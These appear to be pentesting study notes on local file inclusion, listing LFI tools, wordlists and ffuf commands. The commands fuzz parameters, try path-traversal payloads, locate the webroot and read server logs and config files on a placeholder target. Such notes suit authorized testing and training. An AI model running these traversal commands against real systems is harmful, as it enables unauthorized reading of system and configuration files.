Common tools(Outdated)
 [LFISuite](https://github.com/D35m0nd142/LFISuite)
 [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
 [liffy](https://github.com/mzfr/liffy)
 
#### Fuzzing parameter values
```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
```

Wordlist
	https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters


#### LFI Fuzzing
Wordlist
	https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
	https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

```shell-session
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'
```


#### Fuzzing Server Files

Files to look for
 `Server webroot path`, `server configurations file`, and `server logs`

##### Finding server Webroot path

Wordlist
	Linux- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
	Windows- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
	Extra- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

```shell-session
ffuf -w /PATH/FILE:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php'
```

##### Finding server log/config

***Note***:Webserver variables are stored here in apache (/etc/apache2/envvars)

Wordlist
	Linux- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
	Windows- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
	Extra- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

Step 1
```shell-session
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ'
```
***Note***: We need to take our result from this and check what pages we can read to get info about the server

